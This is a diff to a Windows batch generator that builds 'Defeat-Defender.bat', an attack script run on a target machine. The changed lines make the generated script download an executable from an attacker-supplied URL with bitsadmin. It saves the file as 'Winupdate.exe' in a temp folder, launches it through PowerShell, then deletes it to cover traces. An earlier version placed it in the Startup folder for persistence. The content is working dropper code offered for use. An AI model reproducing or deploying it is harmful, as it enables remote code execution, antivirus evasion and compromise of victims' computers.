@@ -19,10 +19,13 @@ EXIT /B %ERRORLEVEL%
 echo.
 echo Your  Url is :  %a% 
 echo. >>Defeat-Defender.bat
-echo bitsadmin /transfer Packages /download /priority foreground %a% "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" >>Defeat-Defender.bat
+echo mkdir %temp%\temp_folder >>Defeat-Defender.bat
+echo bitsadmin /transfer Packages /download /priority foreground %a% "%temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
-echo powershell -command "start Winupdate.exe" >>Defeat-Defender.bat
+echo powershell -command "start %temp%\temp_folder\Winupdate.exe" >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
+echo del %temp%\temp_folder\Winupdate.exe >>Defeat-Defender.bat
+echo rmdir %temp%\temp_folder >>Defeat-Defender.bat
 echo. >>Defeat-Defender.bat
 echo.
 echo File Generated Successfully.Run Defeat-Defender.bat on target machine .
